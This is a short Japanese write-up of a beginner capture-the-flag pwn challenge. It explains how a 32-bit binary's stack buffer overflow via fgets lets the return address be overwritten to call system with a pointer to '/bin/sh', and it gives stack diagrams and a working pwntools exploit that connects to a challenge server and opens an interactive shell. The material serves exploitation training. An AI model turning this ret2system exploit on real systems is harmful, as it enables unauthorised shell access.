# pwn beginners 0x08

### 解法

* 32bit用バイナリ(x86)
* fgetsが使われているが、スタックバッファーオーバーフローが可能
* 上記の理由により、EIP(x86でのプログラムカウンタ名)を任意のアドレスに変えることができる。
* system関数があるが、引数がnull
* `/bin/sh`の文字列がデータ領域に存在する。

リターンアドレスをsystem関数呼び出しの直前に書き換え、  system関数の引数に`/bin/sh`文字列(へのポインタ)をセットできればシェルを起動できる。  
x86では関数呼び出しの際の第一引数はスタックの先頭に置く。


|入力前のスタック|
|:-----:|
|vuln関数の|
|スタックフレーム|
|同上|
|同上|
|main関数へのリターンアドレス|
|?????????|
|?????????|


|入力後のスタック|
|:-----:|
|AAAAAAAAA|
|AAAAAAAAA|
|AAAAAAAAA|
|AAAAAAAAA|
|systemへのアドレス|
|/bin/shへのポインタ|
|?????????|


|リターン後のスタック|
|:-----:|
|/bin/shへのポインタ(systemの第一引数)|
|?????????|


### exploit code
```python
from pwn import *

conn = remote("133.1.17.119", 15028)

system = 0x804854c
binsh = 0x80486ee

exp = "A" * (11 * 4)
exp += p32(system)
exp += p32(binsh)


conn.recvline()
conn.recvline()

conn.sendline(exp)
conn.interactive()
```


